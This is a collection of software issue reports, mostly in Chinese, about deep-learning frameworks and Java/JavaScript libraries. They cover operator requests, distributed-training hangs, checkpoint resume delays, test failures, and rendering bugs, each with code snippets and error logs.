Add ReduceMin op for cpu,"Customer's Demands on Product/Solution Gaps to Fill on Product/Solution Preliminary Discussion Reduces a dimension of a tensor by the minimum value in the dimension. If axis is (), and keep_dims is False, the output is a 0-D tensor representing the minimum of all elements in the input tensor. If axis is int, set as 2, and keep_dims is False, the shape of output is :math:. If axis is tuple(int), set as (2, 3), and keep_dims is False, the shape of output is :math:. Examples: &gt;&gt;&gt; input_x = Tensor(np.random.randn(3, 4, 5, 6).astype(np.float32)) &gt;&gt;&gt; op = P.ReduceMin(keep_dims=True) &gt;&gt;&gt; output = op(input_x, 1) &gt;&gt;&gt; result = output.shape &gt;&gt;&gt; print(result) (3, 1, 5, 6) Acceptance Standards Requirement Value Description   <code>: (x_1, x_3, ..., x_R) (x_1, x_4, ..., x_R)"
"多机下update_method=nccl2,  打开memory_optimize后，运行报错","参数如下： 运行结果如下，然后hang住： 若关闭memory_optimize后，则可以正常跑   <code>: batch_size: 32 cpus: 1 data_format: NCHW data_path: data_set: flowers device: GPU gpus: 8 infer_only: False iterations: 80 learning_rate: 0.001 memory_optimize: True model: resnet no_test: False pass_num: 100 profile: False skip_batch_num: 5 update_method: nccl2 use_cprof: False use_fake_data: False use_nvprof: False use_reader_op: False yq01-jpaas-ai00-let0048:26470:26470 [0] INFO NET : Using interface eth0:10.255.123.15&lt;0&gt; yq01-jpaas-ai00-let0048:26470:26470 [0] INFO NET/IB : Using interface eth0 for sideband communication yq01-jpaas-ai00-let0048:26470:26470 [0] INFO NET/IB: [0] mlx5_0:1/RoCE yq01-jpaas-ai00-let0048:26470:26470 [0] INFO Using internal Network IB yq01-jpaas-ai00-let0048:26470:26470 [0] INFO Using NCCL Low-latency algorithm for sizes below 16384 NCCL version 2.1.15+cuda9.0 yq01-jpaas-ai00-let0048:26470:26615 [1] INFO NET/IB: Dev 0 Port 1 qpn 1274 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26614 [0] INFO NET/IB: Dev 0 Port 1 qpn 1273 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1276 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26614 [0] INFO CUDA Dev 0, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26616 [2] INFO NET/IB: Dev 0 Port 1 qpn 1279 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1280 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26615 [1] INFO CUDA Dev 1, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1283 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26616 [2] INFO CUDA Dev 2, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1286 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1288 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1290 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26617 [3] INFO NET/IB: Dev 0 Port 1 qpn 1291 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1293 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26617 [3] INFO CUDA Dev 3, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1296 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26618 [4] INFO NET/IB: Dev 0 Port 1 qpn 1297 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1299 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26618 [4] INFO CUDA Dev 4, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1302 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26619 [5] INFO NET/IB: Dev 0 Port 1 qpn 1303 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1305 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26619 [5] INFO CUDA Dev 5, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1308 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26620 [6] INFO NET/IB: Dev 0 Port 1 qpn 1309 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1311 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26620 [6] INFO CUDA Dev 6, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1314 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26621 [7] INFO NET/IB: Dev 0 Port 1 qpn 1315 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1317 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26621 [7] INFO CUDA Dev 7, IB Ports : mlx5_0/1(SOC) yq01-jpaas-ai00-let0048:26470:26511 [0] INFO NET/IB: Dev 0 Port 1 qpn 1320 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26614 [0] INFO Using 256 threads yq01-jpaas-ai00-let0048:26470:26614 [0] INFO Min Comp Cap 6 yq01-jpaas-ai00-let0048:26470:26614 [0] INFO NCCL_SINGLE_RING_THRESHOLD=131072 yq01-jpaas-ai00-let0048:26470:26614 [0] INFO Ring 00 : 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 yq01-jpaas-ai00-let0048:26470:26614 [0] transport/net_ib.cu:204 WARN No module present for GPU Direct RDMA. yq01-jpaas-ai00-let0048:26470:26621 [7] transport/net_ib.cu:204 WARN No module present for GPU Direct RDMA. yq01-jpaas-ai00-let0048:26470:26619 [5] INFO Ring 00 : 5[5] -&gt; 6[6] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26617 [3] INFO Ring 00 : 3[3] -&gt; 4[4] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26618 [4] INFO Ring 00 : 4[4] -&gt; 5[5] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26616 [2] INFO Ring 00 : 2[2] -&gt; 3[3] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26620 [6] INFO Ring 00 : 6[6] -&gt; 7[7] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26615 [1] INFO Ring 00 : 1[1] -&gt; 2[2] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26614 [0] INFO 15 -&gt; 0 via NET/IB/0 yq01-jpaas-ai00-let0048:26470:26614 [0] INFO Ring 00 : 0[0] -&gt; 1[1] via P2P/direct pointer yq01-jpaas-ai00-let0048:26470:26621 [7] INFO NET/IB: Dev 0 Port 1 qpn 1321 mtu 3 GID 0 (80FE/AAFBA3FEFF9A0DEE) yq01-jpaas-ai00-let0048:26470:26470 [0] INFO Launch mode Parallel mlx5: yq01-jpaas-ai00-let0048.yq01.baidu.com: got completion with error: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000030 00000000 00000000 00000000 00000000 00008813 09000529 08a7a3d2 yq01-jpaas-ai00-let0048:26470:26622 [7] transport/net_ib.cu:775 WARN NET/IB : Got completion with error 10, opcode 1, vendor err 136 yq01-jpaas-ai00-let0048:26470:26622 [7] INFO include/net.h:33 -&gt; 1 [Net] yq01-jpaas-ai00-let0048:26470:26622 [7] INFO transport/net.cu:385 -&gt; 2 yq01-jpaas-ai00-let0048:26470:26622 [7] INFO transport.cu:147 -&gt; 2 [Proxy thread]"
checkpoint载入后第一步训练前大量时间空置,"这一段非常影响性能。在读取样本较慢、训练总数较大的时候（比如1秒读取一个batch数据的时候，有2万个batch数据）。一个存档点step_id在5000，加载了存档点岂不是要当空读数据5000秒之后才真正开始训练？ 在有shuffle的时候重复一个epoch里一些数据重复用于训练问题不是很大吧？ 我还以为怎么回事，一下午怎么event_handler一点输出也没有。 建议给个参数用来遗弃存档点的step_id   <code>: def _train_by_any_executor(self, event_handler, exe, num_epochs, reader): if self.checkpoint_cfg: epochs = [ epoch_id for epoch_id in range(num_epochs) if epoch_id &gt;= self.checkpoint_cfg.epoch_id ] else: epochs = [epoch_id for epoch_id in range(num_epochs)] for epoch_id in epochs: event_handler(BeginEpochEvent(epoch_id)) for step_id, data in enumerate(reader()): if self.__stop: if self.checkpoint_cfg: self._clean_checkpoint() return if self.checkpoint_cfg and self.checkpoint_cfg.load_serial \ and self.checkpoint_cfg.step_id &gt;= step_id and self.checkpoint_cfg.epoch_id == epoch_id: continue begin_event = BeginStepEvent(epoch_id, step_id) event_handler(begin_event) if begin_event.fetch_metrics: metrics = exe.run(feed=data, fetch_list=[ var.name for var in self.train_func_outputs ]) else: metrics = exe.run(feed=data, fetch_list=[]) if self.checkpoint_cfg: self._save_checkpoint(epoch_id, step_id) event_handler(EndStepEvent(epoch_id, step_id, metrics)) event_handler(EndEpochEvent(epoch_id)) if self.checkpoint_cfg: self._clean_checkpoint() if self.checkpoint_cfg and self.checkpoint_cfg.load_serial \ and self.checkpoint_cfg.step_id &gt;= step_id and self.checkpoint_cfg.epoch_id == epoch_id: continue"
Fix compile on develop branch,"fix the compiler problem:   <code>: Error making directory ""/python/paddle/v2/framework/proto"". make[2]: *** [framework_py_proto] Error 1 make[1]: *** [paddle/framework/CMakeFiles/framework_py_proto.dir/all] Error 2 make: *** [all] Error 2"
关于Inner注解，有点疑问。Inner在设计的时候，是否就只考虑作为服务内部的调用？,pig版本: 3.4.1 是否修改包名: 无。 无。 无。 被 注解修饰的，是不是只单纯在服务之间调用的，无法兼容从内部和gateway过来的请求。例如，如果是内部调用，就走aop，如果从gateway过来，就走oauth。   <code>: @Inner
[CT][MS][OP]GRUCell report AttributeError when has_bias is false at gpu and ascend pynative mode,"Hardware Environment(/): Ascend/GPU /device gpu : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_grucell_input_size_18_hidden_size_20_has_bias_false_fp32 test_grucell_input_size_80_hidden_size_132_has_bias_false_float32 test_grucell_input_size_480_hidden_size_358_has_bias_false_float32 test_grucell_hx_x_dtype_fp16 test_grucell_hx_x_dtype_int16 test_grucell_hx_value_incorrect test case with pytest test_grucell.py pynative 模式下， has_bias 设为false， 抛错如下： 执行通过   <code>: def test_grucell_input_size_18_hidden_size_20_has_bias_false_fp32(): x = Tensor(np.random.randn(15, 18).astype(np.float32)) hx = Tensor(np.random.randn(15, 20).astype(np.float32)) fact = GRUCellMock( attributes={'input_size': 18, 'hidden_size': 20, 'has_bias': False}, inputs=[x, hx]) &gt; fact.forward_cmp() test_grucell.py:57: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/grucell_ops.py:114: in forward_cmp ms_input = self.forward_mindspore_impl() ../share/ops/nn/grucell_ops.py:51: in forward_mindspore_impl out = net(self.input_x, self.hidden) ../share/utils.py:149: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/caory_3.8/lib/python3.8/site-packages/mindspore/nn/cell.py:402: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/caory_3.8/lib/python3.8/site-packages/mindspore/nn/cell.py:344: in run_construct output = self.construct(*cast_inputs, **kwargs) /root/miniconda3/envs/caory_3.8/lib/python3.8/site-packages/mindspore/nn/layer/rnns.py:628: in construct return _gru_cell(inputs, hx, self.weight_ih, self.weight_hh, self.bias_ih, self.bias_hh) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = WrapOp&lt;&gt;, name = 'bias_ih' def __getattr__(self, name): if '_params' in self.__dict__: params = self.__dict__['_params'] if name in params: if context.get_context(""mode"") == context.PYNATIVE_MODE: return self.cast_param(params[name]) return params[name] if '_cells' in self.__dict__: cells = self.__dict__['_cells'] if name in cells: return cells[name] if '_tensor_list' in self.__dict__: tensor_list = self.__dict__['_tensor_list'] if name in tensor_list: return self.cast_param(tensor_list[name]) if '_params_list' in self.__dict__: params_list = self.__dict__['_params_list'] if name in params_list: para_list = params_list[name] cast_list = list() for para in para_list: cast_list.append(self.cast_param(para)) para_list = ParameterTuple(cast_list) return para_list &gt; raise AttributeError(""'{}' object has no attribute '{}'."".format(type(self).__name__, name)) E AttributeError: 'WrapOp' object has no attribute 'bias_ih'."
select分组问题,"版本：2.7.6 描述： select控件里面的html只能以option标签开头，不能以optgroup开头，代码中如果删掉第5行就会出现渲染异常 未去掉第5行前正常显示：   <code>: var selectHtml = ''; if (result.length &gt;= 1) { selectOption = !!selectOption &amp;&amp; typeof (selectOption) == 'string' ? selectOption : result[0].item_id + result[0].lot_no + result[0].supplier_id; var structureItems = result.map(a =&gt; a.item_id).removeAllRepeat(); selectHtml += ""&lt;option value=''&gt;请选择物料&lt;/option&gt;""; for (var i = 0; i &lt; structureItems.length; i++) { var items = result.filter(e =&gt; e.item_id == structureItems[i]); var showLabel = items[0].item_name; selectHtml += '&lt;optgroup label=""' + showLabel + '""&gt;'; $.each(items, function (j, item) { var identifyId = item.item_id + item.lot_no + item.supplier_id; var showText = showLabel + "" Lot:"" + item.lot_no; var selectedAttribute = !!selectOption &amp;&amp; selectOption == identifyId ? 'selected' : ''; selectHtml += '&lt;option value=""' + identifyId + '"" data-lotno=""' + item.lot_no + '"" data-itemid=""' + item.item_id + '"" data-supplierid=""' + item.supplier_id + '"" ' + selectedAttribute + '&gt;' + showText + '&lt;/option&gt;'; }); selectHtml += '&lt;/optgroup&gt;'; } } $('[name=""ItemId""]').html(selectHtml); config.currentForm.render('select');"
【众智】【计算-GPU开发】Digamma,Digamma 计算输入上伽马函数的对数导数。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py input output 对应底层算子 对应底层AI CPU算子Digamma Classify Name Type TypeRange Required Doc AttrDefault INPUT input BasicType TRUE OUTPUT output BasicType TRUE PyTorch1.8.1接口： torch.digamma https://pytorch.org/docs/1.8.1/generated/torch.digamma.html 3. 异常处理 4. 算子反向 参考torch/tools/autograd/derivatives.yaml: digamma   <code>: class Digamma(Primitive):
[ST][MS/modelzoo][NET][shufflenetv1][ascend/GPU] net can't depends on mindvision,mindvision作为独立套件，modelzoo下的网络脚本不应依赖mindvision / 硬件环境: /device ascend GPU : -- MindSpore version :r1.9 commit_id:4e8cc723 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220810 MindSpore 版本：编译时间202209 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_shufflenetv1_imagenet_train_check_fps_1p_0001.py cd solution_test/cases/02network/00cv/shufflenetv1/train/ pytest -s test_ms_shufflenetv1_imagenet_train_check_fps_1p_0001.py 网络脚本不依赖mindvision并且训练成功 走给李相宜   <code>: mindvision作为独立套件，modelzoo下的网络脚本不应依赖mindvision 套件和modelzoo是两条并行线开发，相互间不应该有依赖
【MindSpore】【Ascend】【C类】【efficientnet-b0】8p训练执行时间超时,"【efficientnet-b0】8p训练执行时间超时 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端: /device ascend : --CANN 版本: (CANN 5.0.2.B058) --MindSpore 版本: mindspore 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 Steps to reproduce the issue / 重现步骤 执行命令bash ./run_distribute_train.sh ./hccl_8p_01234567_51.38.67.179.json /data1/mwx989155/MindSpore/efficientnet-b0/data/imagenet/train/ efficientnet-b0/scripts/train_parallel0目录下查看日志tail -f log.txt Describe the expected behavior / 预期结果 跑350轮需要29hours 轮次设置为2 26号下午启动到27号11点，训练还未完成，训练超时 Related log / screenshot / 日志 / 截图   <code>: /data1/mwx989155/MindSpore/efficientnet-b0/scripts/train_parallel0# tail -f log.txt [WARNING] HCCL_ADPT(36058,7fbec5081740,python):2022-04-26-08:37:40.338.202 [mindspore/ccsrc/runtime/hccl_adapter/hccl_adapter.cc:58] GenHcclOptions] The environment variable DEPLOY_MODE is not set. Now set to default value 0 [WARNING] DEVICE(36058,7fbec5081740,python):2022-04-26-08:38:19.793.718 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:327] FilterRaisedOrReducePrecisionMatchedKernelInfo] Operator:[DropoutGenMask] don't support int64, reduce precision from int64 to int32. [WARNING] DEVICE(36058,7fbec5081740,python):2022-04-26-08:38:26.129.117 [mindspore/ccsrc/runtime/hardware/ascend/ascend_graph_optimization.cc:255] SelectKernel] There are 81 node/nodes used raise precision to selected the kernel! [WARNING] DEVICE(36058,7fbec5081740,python):2022-04-26-08:38:26.129.164 [mindspore/ccsrc/runtime/hardware/ascend/ascend_graph_optimization.cc:259] SelectKernel] There are 1 node/nodes used reduce precision to selected the kernel! epoch: [ 0/ 2], step:[ 624/ 625], loss:[5.200/5.200], time:[622446.655], lr:[0.100] epoch time: 633896.497, per step time: 1014.234, avg loss: 5.200 epoch: [ 1/ 2], step:[ 624/ 625], loss:[4.386/4.386], time:[285658.399], lr:[0.200] epoch time: 286228.998, per step time: 457.966, avg loss: 4.386 跑350轮需要29hours 轮次设置为2 26号下午启动到27号11点，训练还未完成 """""" network config setting, will be used in train.py and eval.py """""" from easydict import EasyDict as ed # config for efficientnet, imagenet2012. config = ed({ ""class_num"": 1000, ""batch_size"": 256, ""loss_scale"": 1024, ""momentum"": 0.9, ""weight_decay"": 1e-5, ""epoch_size"": 350, ""save_checkpoint"": True, ""save_checkpoint_epochs"": 1, ""keep_checkpoint_max"": 5, ""save_checkpoint_path"": ""./checkpoint"", ""opt"": 'rmsprop', ""opt_eps"": 0.001, ""warmup_epochs"": 2, ""lr_decay_mode"": ""liner"", ""use_label_smooth"": True, ""label_smooth_factor"": 0.1, ""lr_init"": 0.0001, ""lr_max"": 0.2, ""lr_end"": 0.00001 })"
[CT][MS][OCCM][setsize] 算子在ascend上显示报错，提示RuntimeError: Sync stream failed:Ascend_3,"算子在ascend上 运行用例 test_p_setsize_func 出现RuntimeError: Sync stream failed:Ascend_3,但是 setsize 的so包是有的。 def test_p_setsize_func(): values_types = ([np.int8, mstype.int8], [np.int16, mstype.int16], [np.uint8, mstype.uint8], [np.uint16, mstype.uint16], [np.int32, mstype.int32], [np.int64, mstype.int64]) for v_type in values_types: set_shape_list = [] for _ in range(3): set_shape_list.append(random.randint(2, 5)) set_shape = Tensor(np.array(set_shape_list).astype(np.int64)) max_values_num = set_shape[0] * set_shape[1] * set_shape[2] values_num = np.random.randint(2, max_values_num, size=(1)) set_values = Tensor(np.random.randint(0, 128, size=(values_num[0])).astype(v_type[0])) set_indices = Tensor(np.array(gen_indices_data_file([values_num, 3], set_shape)).astype(np.int64)) ../operations/test_setsize.py:111: ../share/ops/primitive/setsize_ops.py:57: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/setsize_ops.py:33: in forward_mindspore_impl out = net(self.set_indices, self.set_values, self.set_shape) ../share/utils.py:199: in call out = super().call(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:626: in call out = self.compile_and_run(*args) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:946: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1358: in call return self.run(obj, *args, phase=phase) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1395: in run return self._exec_pip(obj, *args, phase=phase_real) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff61b1bad0&gt; obj = WrapOp&lt;&gt;, phase = 'train.1668924789397541632.281472836340336.0' args = (Tensor(shape=[17, 3], dtype=Int64, value= [[0, 0, 1], [0, 0, 2], [0, 1, 1], ... [1, 2, 0], [1, 2, 1], [1, 2, 2]...2, 1, 30, 81, 89, 31, 50, 75, 45, 45, 115, 58, 112, 31]), Tensor(shape=[3], dtype=Int64, value= [2, 3, 4])) fn = &lt;bound method SetSizeNet.construct of WrapOp&lt;&gt;&gt; E RuntimeError: Sync stream failed:Ascend_3 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:634 Run /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1377: RuntimeError Hardware Environment(/) / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_setsize_func test_p_setsize_right_attr_false test_p_setsize_right_attr_true 用例通过   <code>: fact = SetSizeMock(attributes={""validate_indices"": True}, inputs=[set_indices, set_values, set_shape]) fact.forward_cmp() @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ return self._graph_executor(args, phase)"
png转jpg，白色背景问题,"使用的JDK版本和Hutool版本 1.8；4.5.16 png转到jpg，图片变成了黑色。由于原图字也是黑色，导致转换后无法看到内容。如图 // bGr.drawImage(img, 0, 0, Color.WHITE,null);   <code>: public static BufferedImage copyImage(Image img, int imageType) { final BufferedImage bimage = new BufferedImage(img.getWidth(null), img.getHeight(null), imageType); final Graphics2D bGr = bimage.createGraphics(); bGr.drawImage(img, 0, 0, null); //改这里 bGr.dispose(); return bimage; }"
在本地报表插入图片 上传到服务器，图片看不到,版本号：1.4.0-beta   <code>: 在本地报表插入图片 上传到服务器，图片看不到
reopen LinkChecker for checking URLs,LinkChecker is used for checking for broken links in websites. But it is disabled in travis/build_doc.sh#L18 We should reopen it.   <code>: #linkchecker doc/en/html/index.html #linkchecker doc/cn/html/index.html
动态表名,"当前使用版本 以前版本使用方式 我只有单独两张表需要分库分表，这个用3.4.3.3应该如何优雅的实现   <code>: dynamicTableNameInnerInterceptor.setTableNameHandler((sql, tableName) -&gt; { Map&lt;String, Object&gt; paramMap = RequestDataHelper.getRequestData(); paramMap.forEach((k, v) -&gt; (k + """" + v)); String year = ""_2018""; int random = new Random().nextInt(10); if (random % 2 == 1) { year = ""_2019""; } return tableName + year; }); interceptor.addInnerInterceptor(dynamicTableNameInnerInterceptor); HashMap&lt;String, TableNameHandler&gt; map = new HashMap&lt;String, TableNameHandler&gt;(); map.put(""user_daily_record"", new DaysTableNameParser()); map.put(""user_consume_flow"", new IdModTableNameParser(10)); dynamicTableNameInnerInterceptor.setTableNameHandlerMap(map);"
"[CT][MS][parallel]ps, embedding_heterogeneous, raise runtime error",": /device ascend : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel cd /home/wys/code/MindSporeTest/parallel/parameter_server bash ../../share/parallel/tool/pytest_parallel_ps.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -n 3 -f test_parameter_server_basic_data_parallel.py -t test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel ps, embedding_heterogeneous, raise runtime error only run ps, or only run no ps, case pass, but , run together , case fail case pass or info: 0x2227b, ifu error info: 0x3cb57bfd6f580, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.605 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 27, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x9ce31d7, mte error info: 0x2227b, ifu error info: 0x3bb33ffbe7b80, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.615 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 28, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064280, vec error info: 0x1fb1cffe, mte error info: 0x2227b, ifu error info: 0x3b9ff37ce3f00, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.624 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 29, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064300, vec error info: 0xdfdebd5, mte error info: 0x2227b, ifu error info: 0x17da4325f7e80, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.638 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 30, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x1ffeffa7, mte error info: 0x2227b, ifu error info: 0x2bc7a7bef8780, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.648 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 31, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x1def15ff, mte error info: 0x2227b, ifu error info: 0x3ff3bef6f7680, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.726 [device_error_proc.cc:607] 129140 ProcErrorInfo: finished to process device error info, retCode=0. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.737 [engine.cc:908] 129140 ReportExceptProc: excptCallBack_ is null. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.746 [stream.cc:877] 129140 TryDelRecordedTask: del public task from stream, stream_id=18, tailTaskId=1, delTaskId=1, head=2, tail=3 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.756 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=7, serial_id=1 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.765 [logger.cc:1361] 129140 TaskFinished: device_id=0, stream_id=18, task_id=1, task_type=13,task_finish_num=1314 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.775 [pool.cc:452] 129140 GetItemBySerial: stream_id=17, task_id=35, serial_id=32 [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.874 [task.cc:692]129140 PrintErrorInfo:Aicore kernel execute failed, device_id=0, stream_id=17, report_stream_id=18, task_id=32, fault kernel_name=BNTrainingReduceGrad_1942374668486120580_0__kernel0, func_name=BNTrainingReduceGrad_1942374668486120580_0__kernel0, program id=22, hash=7572733580691254732. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.887 [task.cc:2180]129140 ReportErrorInfo:model execute error, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.895 